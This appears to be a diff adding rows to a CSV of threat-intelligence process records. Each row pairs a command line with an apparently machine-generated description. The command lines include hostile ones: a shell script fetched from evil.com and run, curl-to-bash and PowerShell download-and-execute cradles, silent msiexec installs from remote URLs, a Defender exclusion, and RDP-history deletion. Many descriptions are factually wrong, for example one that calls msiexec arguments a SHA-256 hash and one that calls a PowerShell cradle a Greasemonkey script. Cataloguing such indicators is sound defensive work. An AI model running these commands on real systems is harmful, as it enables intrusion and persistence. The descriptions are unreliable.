+,kinit -kt /etc/krb5.keytab; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh testuser,,,process--1d610153-05e9-4e8d-aa90-55bafe9a8dd6,,kinit,process,"The object contains a process entity identified by the name 'kinit' within the binary_ref field is missing. The command line script associated with this process involves several steps: 
+
+firstly, it utilizes kinit to establish a keytab file located at /etc/krb5.keytab; 
+secondly, it downloads a suspicious shell script named 'shell.sh' from a remote server 'evil.com'; 
+thirdly, the downloaded script is saved in the local directory as '/tmp/shell.sh', and its permissions are modified to be executable with the command chmod +x /tmp/shell.sh; 
+finally, the script is executed using the user 'testuser' by running the command /tmp/shell.sh testuser."
+,kinit -kt /etc/krb5.keytab testuser,,,process--0b7f15a4-4434-423c-9e3f-c01012ddcce0,,kinit,process,"The object contains a dictionary representing a process named 'kinit'. The dictionary includes the following information:
+
+- It is of type 'process'.
+- The name of the process is 'kinit'.
+
+There are no details available about its command line, description, or extensions. Additionally, it appears to be a scripted process as indicated by the presence of a command in the 'command_line' field, but further context for the scripting language used would require additional information."
+,/bin/sh -c $(curl -sfL hxxp://194[.]38[.]11[.]3:1790/b.sh | bash | gzip -n | base64 -w0),,,process--75054033-1aa5-44a2-8948-e8c7c4e4474c,,,process,"The object contains a process with an invalid binary reference. The command line for the process is given as '/bin/sh -c $(curl -sfL hxxp://194[.]38[.]11[.]3:1790/b.sh | bash | gzip -n | base64 -w0)'. This command appears to be a complex pipeline of commands that downloads a script from a specific URL, runs it with Bash, compresses the output with Gzip, and then encodes the result in Base64. However, the binary reference is missing, which is likely to cause issues with the process.
+
+There are no extensions associated with this process, and the description field is empty. The image field is also missing, and the name field has an invalid value."
+,"C:\Windows\system32\cmd.exe /d /s /c ""powershell -c ""curl hxxps://webhook[.]site/xxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx""""",,,process--b148726f-52df-4d93-8d35-d96c1d454868,,,process,"The object contains a process with an unspecified binary reference. The command line used to launch this process is a Windows system command, which invokes the PowerShell interpreter to execute a specific curl command. This curl command attempts to connect to a webhook URL provided in the format of https://webhook.site/xxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.
+
+Unfortunately, due to the lack of information about the binary reference and other metadata, it is not possible to provide more details about this process or its context."
+,C:\windows\system32\openssh\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070,,,process--e9c15fe4-fec6-452f-bfc0-78574beb54c0,,,process,"The object contains a command-line driven process that initiates an SSH (Secure Shell) connection. The process is created using the openssh executable located at C:\windows\system32\openssh\ssh.exe. 
+
+The SSH connection parameters are as follows: -p 443, which specifies port 443 for the connection, and -o ServerAliveInterval=60, -o StrictHostKeyChecking=no, and -o UserKnownHostsFile=/dev/null, which configure server-side behaviors such as interval checks, key verification, and host cache management. 
+
+Additionally, the process utilizes port forwarding (-R 1070) with the destination port being 1070. The command line also specifies that the connection should be kept in a non-interactive mode (-f), where no interactive shell is spawned, and the local port is not opened on the server (-N)."
+,net user DC-01$ P@ssw0rd,,,process--cc561888-7e54-4be7-a5bb-5a954cb08d47,,,process,"The object contains information about a process, specifically a command line operation that was performed on a system. The details provided are as follows:
+
+The command line operation was initiated to create a new user account named DC-01$. The action involves setting the password for this new user account to P@ssw0rd.
+
+No additional information is available regarding the process itself, such as its name or ID, beyond what is shown in the given data."
+,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f",,,process--69cc219d-f668-48ec-834d-b0123c4c0e7f,,,process,"The object contains a process identification number '69cc219d-f668-48ec-834d-b0123c4c0e7f'. The process type is classified as 'process', indicating it is a running program or service. The command-line instruction associated with this process involves deleting the registry key 'HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default' using the reg delete tool in verbose mode (/va) and forcing removal (/f)."
+,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f",,,process--ac017816-e215-461b-b66a-0479614e465b,,,process,"The object contains a process with an ID of 'process--ac017816-e215-461b-b66a-0479614e465b'. The process is associated with the command line parameter 'reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"" /f', indicating that it attempts to remove a setting from the Windows registry related to Terminal Server Client servers."
+,SCCM.exe reconfig /target:[REDACTED],,,process--ebe0e160-e77d-4e6b-b93a-e35ab072dd95,,,process,"The object contains a process information dictionary. 
+
+The process has an unspecified command line used to reconfigure the SCCM system using the 'SCCM.exe' executable, however, the exact target of this reconfiguration is redacted for privacy reasons.
+
+There are no details provided about any extensions or image related to the process, as these fields are empty or not specified."
+,whoami.exe,,,process--bdfb2b2d-d26f-4a43-8c7a-841189482bbc,,,process,"The object contains a process entry with the following characteristics:
+
+It has an unknown binary reference, likely indicating that this process is not part of a known executable.
+The command-line name associated with this process is 'whoami.exe', suggesting it may be related to the Windows operating system or user authentication.
+There is no description provided for this process, which could imply additional information about its function or purpose.
+The file extensions associated with this process are unknown, making it difficult to determine the types of files it handles or interacts with.
+This process belongs to a specific type known as 'process', indicating that it represents an active instance of running code."
+,hostname.exe,,,process--4f1768ab-d2c6-4f6d-ad94-6d74a7c01b2d,,,process,"The object contains a process with the following characteristics:
+
+* The command line used to launch this process is hostname.exe.
+* There are no binary references or image details associated with this process.
+* It does not have any extensions attached to it.
+* This process is categorized as a type of process, but no specific description or name has been provided."
+,nslookup.exe,,,process--0d91ad31-398c-4ba1-bf1f-205bc010f4cf,,,process,"The object contains a process with the following details:
+
+The process has a type of 'process'. It does not have an image associated with it.
+
+The process uses a binary reference that is currently set to NaN (Not a Number), indicating an unknown or missing value. 
+
+The command line used by the process is 'nslookup.exe', which suggests that the process might be related to a network lookup operation.
+
+Additionally, there are fields for description, extensions, and image, but they do not have any values assigned to them."
+,,Google Chrome browser process targeted for credential extraction and memory injection by Vidar Stealer.,,process--67d9f2a6-8619-434c-9984-9c91dcae86c3,,chrome.exe,process,"The object contains a detailed description of a malicious process detected by security software. The process in question is identified as the Google Chrome browser process, specifically labeled as 'chrome.exe'. It has been targeted for credential extraction and memory injection by the Vidar Stealer malware.
+
+Further details reveal that this process has no associated binary reference, command line, or image data available. Additionally, there are no extensions linked to this particular process."
+,,Mozilla Firefox browser process targeted for credential extraction by Vidar Stealer.,,process--c0fbc2a3-a56b-4704-8e40-a47138694c14,,firefox.exe,process,"The object contains a detailed record of a malware sample identified as ""Vidar Stealer"", specifically targeting the Mozilla Firefox browser process. The malicious actor aims to extract credentials from this process.
+
+This malware is associated with a specific executable file named ""firefox.exe"". The nature of the threat suggests that it leverages the system's existing processes to remain stealthy and evade detection.
+
+The specifics of how Vidar Stealer operates are not fully elaborated upon in the provided data. However, its objective is clear: to compromise the Mozilla Firefox browser process for unauthorized access to sensitive information such as credentials.
+
+It is essential for system administrators and users alike to be aware of this threat to ensure their systems remain secure against similar attempts at credential extraction."
+,,Microsoft Edge browser process targeted for credential extraction by Vidar Stealer.,,process--a555dd7c-a5dc-492e-84cc-ca4e3f8806b6,,msedge.exe,process,"The object contains information about a malicious process detected by an unknown entity. The process is identified as 'msedge.exe' and is associated with the Microsoft Edge browser.
+
+The process was targeted for credential extraction by a malware called Vidar Stealer, which suggests that it may have been used to steal sensitive login credentials or other personal data from users who had the browser open at the time of infection."
+,"""PowerShell.exe"" -w h -nop -ep Bypass -c ""$S='hxxps://riverlino[.]com/U.GRE';$j=$env:TEMP+'\1.ps1';(New-Object Net.WebClient).DownloadFile($S,$j);powershell -f $j""",,,process--b385deef-e635-4014-8684-4b022b65252c,,,process,"The object contains information about a suspicious process detected by an unknown system. The process details are as follows:
+
+* The process is identified by the unique identifier 'process--b385deef-e635-4014-8684-4b022b65252c'.
+* The process type is classified as a command-line process, indicating that it is a program launched from the command line.
+* The command used to launch the process is a PowerShell script with the following options:
+ + -w h: This option specifies the width of the console window. However, this value seems out of context and may be unrelated to the process.
+ + -nop: This option stands for ""no profile"" and prevents PowerShell from loading the user's profile file.
+ + -ep Bypass: This option enables the bypassing of security restrictions in PowerShell. This could potentially allow the process to execute malicious code.
+* The command specifies a URL 'hxxps://riverlino[.]com/U.GRE' which is likely a URL that will be used to download and execute a file.
+* The URL is followed by a string '$j=$env:TEMP+\'\\1.ps1\';', which suggests that the downloaded file will have a specific name containing '1.ps1'.
+* The command also executes another PowerShell script with the filename specified in $j using $(New-Object Net.WebClient).DownloadFile($S,$j);.
+* Finally, it runs the newly downloaded and executed PowerShell script using powershell -f $j.
+
+The overall behavior of this process is suspicious as it appears to be downloading and executing a malicious file. However, without further analysis or context, it is difficult to provide a more detailed assessment."
+,"""PowerShell.exe"" -w h -nop -c ""&('iex') (New-Object IO.StreamReader([Net.WebRequest]::Create('https://xunira[.]cloud/C[.]GRE').GetResponse().GetResponseStream())).ReadToEnd()""",,,process--baf9b50b-ce18-46cb-a37d-268fe2e1af80,,,process,"The object contains a malicious PowerShell script that is designed to download a Greasemonkey script from a remote URL. 
+
+The script, which appears to be intended for injection into a web browser, uses the `New-Object` cmdlet to create an instance of `IO.StreamReader`, and then pipes the output of another command to this stream.
+
+The key part of the script is the use of `GetResponseStream()` on the result of calling `[Net.WebRequest]::Create('https://xunira.cloud/C.GRE')`. This suggests that the attacker is attempting to pull in a malicious Greasemonkey script from this URL, which would then be executed within the web browser.
+
+It's worth noting that `GetResponseStream()` returns an object containing the contents of the HTTP response stream. The attacker appears to intend for this stream to be piped into the PowerShell command, where it will likely be interpreted as a string or other data type.
+
+Overall, the script seems designed to compromise a web browser by injecting a malicious Greasemonkey script, although further analysis would be needed to determine its full impact and potential security vulnerabilities."
+,msiexec.exe /i hxxps://global-weekends[.]net/res/helprecord /qn ba5ceb26=2bbb8402(f346c24d*e4bc04ef(8623a414_fad334a0,,,process--f862996f-02b3-478d-aed1-7066bcd80c4b,,,process,"The object contains a process entry with the following characteristics:
+
+It appears to be an executable installation process initiated by the MSIEXEC utility. The command line parameter used is /i, which stands for ""install"", and it references a URL: https://global-weekends.net/res/helprecord.
+
+The URL points to a specific resource on the web, identified by the hash code ba5ceb26. This code seems to be related to a unique identifier or patch version number.
+
+In terms of its type, the process is classified as an executable installation (identified by 'process--f862996f-02b3-478d-aed1-7066bcd80c4b').
+
+The extensions field is not applicable in this context, and metadata information such as timestamps and descriptions are also missing."
+,msiexec.exe /i hxxps://stradomi[.]com/res/presentjudge /qn 84e58207=a84823e3_c3ef427e(29bf9dc6%d30821f6*65bca359)9136c3b0*d438d401%fc61d016,,,process--1ecd82f8-b918-4bf2-91a6-f0d17e54e719,,,process,"The object contains a detailed information about a process that was executed on the system. 
+
+The process has an unknown origin since its binary reference is not available. The command line arguments provided by the process are suspicious in nature as they include a URL for download, which may pose security risks.
+
+When executed, the process was installed with the '/qn' flag, indicating that it was run in quiet mode without any prompts or notifications. However, this does not necessarily indicate malicious activity.
+
+Furthermore, the process is associated with an SHA-256 hash of '84e58207=a84823e3_c3ef427e(29bf9dc6%d30821f6*65bca359)9136c3b0*d438d401%fc61d016'. This suggests that the process was compiled or built from a specific source code, which could potentially be used to track its origin.
+
+The presence of the 'process' type indicates that this is a system-level process and not an application running in isolation."
+,powershell.exe -enc JABsAGwAPQBAACgAMgAyADMALAAyACwAMgAyADYALAAyAD,,,process--4386b875-fa11-47cf-9afb-8087f6788f24,,,process,"The object contains a detailed representation of a Windows process. 
+
+It appears to be a PowerShell process that has been encoded using Base64. The command line parameter provided indicates that the process is running an encoded command.
+
+Unfortunately, due to the encoding used, the actual command being executed by the process cannot be determined from this information alone."
+,wsusservice.exe,,,process--7534ad7f-11b1-4927-a3a7-3241f4fa624b,,wsusservice.exe,process,"The object contains a Windows process named wsusservice.exe. This executable is not assigned to any binary reference or image file. The process type suggests that it is part of the Microsoft Windows Update service.
+
+The command line used to run this process is wsusservice.exe, which is likely the service itself or a utility related to the update mechanism.
+
+There are no extensions or descriptions associated with this process, indicating that little information is available about its functionality or purpose."
+,w3wp.exe,,,process--cd0d35ed-0ef6-4d29-93ed-e2aa2826f881,,w3wp.exe,process,"The object contains information about a process named 'w3wp.exe'. The process is identified by the key 'name' with value 'w3wp.exe', indicating that it is an executable file. 
+
+Further details are provided under other keys, such as 'command_line', which shows that the executable's command line argument is set to 'w3wp.exe'. However, this information seems redundant, given that 'name' already provides the process's name.
+
+Other key-value pairs present in the object are: 'description', 'image', and 'type'. Unfortunately, their corresponding values fall under the category of unknown or missing data ('nan'). This leaves us with no further specific details about the described process."
+,cmd.exe,,,process--4d92b295-2fd0-4630-afa3-7afaa2ed1dc7,,cmd.exe,process,"The object contains a process with the following attributes:
+
+* Name: cmd.exe
+* Type: process
+* Command Line: The command line used to launch the process is 'cmd.exe'.
+* Description: There is no available description for this process.
+* Extensions: No information is available on any file extensions associated with this process.
+
+Note that some of the fields, such as binary_ref and image, are not available or have been marked as nan (not a number), indicating missing or unknown data."
+,powershell.exe,,,process--b0caf29f-4222-4e64-b1ef-a23c986dc16f,,powershell.exe,process,"The object contains the following details about a process:
+
+- The command used to launch the process is powershell.exe.
+- No additional information is available regarding its binary reference, extensions, or image.
+- The description of the process is not provided."
+,curl.exe,,,process--768399f6-eb7a-43ef-bd64-933421b33e9e,,curl.exe,process,"The object contains information about a process named 'curl.exe'. It is identified by the key 'id' with the value 'process--768399f6-eb7a-43ef-bd64-933421b33e9e', but this ID is currently marked as non-applicable (nan). 
+
+The process is associated with a binary reference that does not contain any relevant information, indicated by 'binary_ref' being nan. The command line used to execute the process is specified in the 'command_line' field as 'curl.exe'."
+,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <Base64>,,,process--35a37694-031f-46f1-9a4b-50704b6e0861,powershell.exe,,process,"The object contains a process with the name 'powershell.exe' that was executed using PowerShell. The command-line argument used to launch this process is 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <Base64>'. This suggests that the process was launched in an unauthorized manner, as indicated by the use of the '-ExecutionPolicy Bypass' argument.
+
+The object does not provide any information about the description or extensions associated with this process. However, it is clear that this is a PowerShell process due to its name and the command-line arguments used to launch it.
+
+Overall, the object provides limited but useful information about a process launched using PowerShell in an unauthorized manner."
+,keytool.exe,,,process--930b63ad-0346-4d70-967d-331560ac352c,,keytool.exe,process,The object contains information about a process named 'keytool.exe'. The command-line tool used to manage this process is keytool.exe. It appears that the process has been flagged for further analysis or classification within an automated system.
+,powershell -NoP -ep Bypass,,,process--250da6b5-2212-46c4-b5b1-daa9b20419fb,,powershell.exe,process,"The object contains information about a process named 'powershell.exe'. The command used to run this process is 'powershell -NoP -ep Bypass', which bypasses the execution policy. This suggests that the script is designed to execute in a restricted environment and may be used for malicious purposes.
+
+Additionally, the type of this process is classified as 'process', indicating that it is a software program running on an operating system. The binary reference for this process is not available."
+file--,MSBuild.exe,,,process--18b1ee09-f21f-4009-a875-c3e4613aa1e0,,MSBuild.exe,process,"The object contains a dictionary representing a process named MSBuild.exe. The process is associated with the following attributes:
+
+- A command-line tool identified by its executable name, which suggests it's used for building projects.
+- A description field that remains empty (nan), indicating there might be no additional information available about this specific process.
+- An 'extensions' field that also remains empty (nan), implying no file extensions are associated with MSBuild.exe in the given context.
+- The object contains a reference to a binary file, indicated by its name and the 'binary_ref' key."
+,"powershell.exe Invoke-Command -Command {Add-MpPreference -ExclusionPath ""<malware path>""}",,,process--8fdf6450-4bb1-486a-b55f-9a75808a7f93,,powershell.exe,process,"The object contains information about a process named 'powershell.exe'. This process is related to PowerShell, a command-line shell and task automation framework. The details of the process are as follows:
+
+The process is identified by its unique identifier, which is 'process--8fdf6450-4bb1-486a-b55f-9a75808a7f93'. 
+
+It was invoked via a command line operation that utilized PowerShell's invoke-command feature to execute a command. The specific command used was 'Add-MpPreference -ExclusionPath ""<malware path>""', which suggests that the process is related to updating or managing malware exclusions in the Windows operating system.
+
+The object does not contain any information about its binary reference, image details, extensions, description, or timestamp."
+,wscript.exe %APPDATA%\Microsoft\Windows\Themes\Themes.js,,,process--b9f8364b-6044-40cf-95fd-df8b1c2b33df,,,process,"The object contains a 'process' type, which indicates that it is related to a process running on the system. The key characteristics of this process are:
+
+- It has an empty binary reference.
+- The command line used to run the process is specified in the 'command_line' field, pointing to a Themes.js file located in the %APPDATA% directory of Windows.
+- There is no description provided for this process.
+- Extensions and image details are not included.
+- A unique identifier, 'process--b9f8364b-6044-40cf-95fd-df8b1c2b33df', has been assigned to this process."
+,certutil -decode %Public%\L298306.tmp E-CARD.docx,,,process--febb8aa6-3668-4701-b03d-fde8c45eeafd,,,process,"The object contains a process information summary for an unknown entity. The specific details of the process are not available due to missing data.
+
+Key characteristics of this process include:
+
+- It is classified under the category 'process' type.
+- No command line or executable path was specified, leaving its origin and purpose unclear.
+- A file name associated with the process could be identified, however, it remains undeciphered ('E-CARD.docx') due to the incomplete data available.
+
+Overall, this information provides a basic overview of what is known about the process without offering any specific insights or context."
+,systeminfo,,,process--db235cb2-6be6-4ce9-b4a4-7a64f29b70e9,,,process,"The object contains a process with an ID of 'process--db235cb2-6be6-4ce9-b4a4-7a64f29b70e9'. This process is categorized under type 'process' and does not have any information available on its binary reference, command line, description, or image. Additionally, there are no extensions associated with this process."
+,tasklist,,,process--46fec1c7-7c42-468d-baad-30e3ce071b35,,,process,"The object contains a dictionary that represents a process with the following details:
+
+It appears to be a command-line task related to system processes, as indicated by the 'command_line' field which is set to 'tasklist'. This suggests that the process is likely related to system management or monitoring.
+
+Unfortunately, some of the key information about this process is missing, including its name and image. The 'binary_ref' field is also not available, which makes it difficult to determine the specific binary associated with this process.
+
+Despite the lack of information, the process has been assigned a unique ID ('process--46fec1c7-7c42-468d-baad-30e3ce071b35'), suggesting that some level of identification or tracking system is being used."
+,dir C:\Users /O-D /Q /A,,,process--68ade20b-a927-4847-ae37-5e573fbf0eef,,,process,"The object contains a Windows process with the name ""dir C:\\Users /O-D /Q /A"". The command line argument suggests that it is related to listing the files in the C:\Users directory. However, it appears to be incomplete or malformed as there seems to be an issue with the regular expression pattern ""/O-D /Q /A"", which may not be correctly formatted.
+
+Further investigation into the process reveals that its type is classified as a ""process"". The object's properties are largely undefined due to missing data, specifically regarding its binary reference, image, description, extensions, and name."
+,del %TEMP%\.tmp,,,process--34d7ac78-b1c9-47b8-8db2-2c5a77d5b7cb,,,process,"The object contains a process that has been initiated. The details of this process are as follows:
+
+The process is identified by the unique identifier 'process--34d7ac78-b1c9-47b8-8db2-2c5a77d5b7cb'. However, there appears to be some missing information in the metadata associated with this process.
+
+The command line executed for this process is 'del %TEMP%\\.tmp', which suggests that it has been used to delete a temporary file. Unfortunately, the description of the process is not available due to missing metadata.
+
+It is also unclear what type of process this is ('process' in this case) or what extensions (if any) are associated with it. The image data is also missing, making it difficult to determine further details about the process."
+,sudo /etc/cloudx/cloudxd [...] user_login_management get_password --username foobar --password foobar --login-ip {user_ip},,,process--a837b69c-4770-403f-880c-446e935b5cbb,,,process,"The object contains a process-related data structure with the following information:
+
+The process has an undefined binary reference.
+
+A command line script is defined, consisting of a series of commands that are executed when the script is run. The script starts with 'sudo' and executes a number of commands, including user login management and getting a password for a specific username and IP address. 
+
+No description or extensions information is provided.
+
+The process has an undefined image reference.
+
+A name field does not contain any meaningful data; it appears to be blank.
+
+The type of the object is 'process'."
+,/usr/bin/cp /var/avxui/test_proxy_connectivity-server_ca_cert.txt crontab --suffix /usr/local/share/ca-certificates/ test_proxy_connectivity-server_ca_cert.crt,,,process--2d884f0d-8eaa-4763-9276-5fe0cac7470e,,,process,"The object contains information about a process running on the system. The process is identified by its unique identifier, but it lacks a binary reference to further describe its nature. 
+
+In terms of command execution, this process is seen to execute a command that uses cp to transfer a certificate file from one location to another within the system's structure. The command specifically targets the crontab file and transfers a certificate named 'test_proxy_connectivity-server_ca_cert.crt' into a specific directory for handling certificate configurations.
+
+This process does not include any detailed description, extensions, or image information about its nature or the environment it operates in."
+,/usr/bin/cp /var/avxui/test_proxy_connectivity-server_ca_cert.txt crontab etc --suffix /usr/local/share/ca-certificates/ test_proxy_connectivity-server_ca_cert.crt,,,process--dccb43d2-2b27-4a37-a615-b0cf2b693d4e,,,process,"The object contains a detailed specification of a process execution, which is identified by the 'id' field. Unfortunately, due to missing data in some fields, several key aspects cannot be accurately described.
+
+The specified process appears to involve executing a command via the cron job system on an operating system. The command itself involves copying a certificate file from one location to another using the cp utility. Specifically, it moves the 'test_proxy_connectivity-server_ca_cert.txt' and renames it to 'test_proxy_connectivity-server_ca_cert.crt' in order to be recognized by the system for trusted certificates.
+
+The exact purpose of this process is not explicitly stated but appears to relate to proxy connectivity testing or setup. The presence of an AVXUI identifier suggests that this might be part of a larger security or testing framework, possibly for checking system configurations or network connections.
+
+Key details about the process execution are obscured by missing metadata such as timestamps and image identifiers. These elements typically provide context about when the task was initiated and what kind of process it is (e.g., whether it's a service or running application). Without these pieces, it is challenging to fully understand the nature or goals of this specific process."
+,curl [callback URL],,,process--ef9fb28d-44af-474b-bc87-c84bac5f8f54,,,process,"The object contains a process with an unknown binary reference, command line instructions to execute a curl request using a callback URL, and no descriptive details. The process type is specified as 'process', but no additional information such as its name or extensions are provided."
+,"aws sts assume-role --role-arn ""arn:aws:iam::[...]:role/aviatrix-role-app"" --role-session-name ""AviatrixSession""",,,process--ebc14add-5d15-40a7-8aca-92d06c4f1e21,,,process,"The object contains a process definition that has the following characteristics:
+
+* It does not specify a binary reference for the process.
+* The command line to run the process is provided and involves assuming an IAM role named ""AviatrixRoleApp"" using the AWS CLI. The role session name is set to ""AviatrixSession"".
+* A description of the process is not available.
+* No extensions are associated with this process definition.
+* The image or file that corresponds to this process is unknown.
+* The name of the process is currently unspecified.
+
+Overall, while there are some details provided about how to run this process, many key aspects remain unclear due to missing information."
